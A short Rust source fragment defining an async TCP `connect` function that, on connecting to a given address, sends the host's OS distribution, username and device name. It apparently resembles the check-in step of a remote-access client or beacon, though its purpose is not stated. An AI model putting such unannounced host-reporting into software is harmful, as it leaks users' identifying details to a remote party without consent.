use std::env;
use std::io::{Read, Write};
use std::str::from_utf8;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt, BufReader},
    net::TcpStream,
};
use util;

pub async fn connect(addr: &str) -> Result<TcpStream, ()> {
    match TcpStream::connect(&addr).await {
        Ok(mut stream) => {
            let device_info = format!(
                "{}\n{}\n{}",
                whoami::distro(),
                whoami::username(),
                whoami::devicename()
            );

            stream.write_all(device_info.as_bytes()).await.unwrap();
            Ok(stream)
        }
        Err(_e) => Err(()),
    }
}
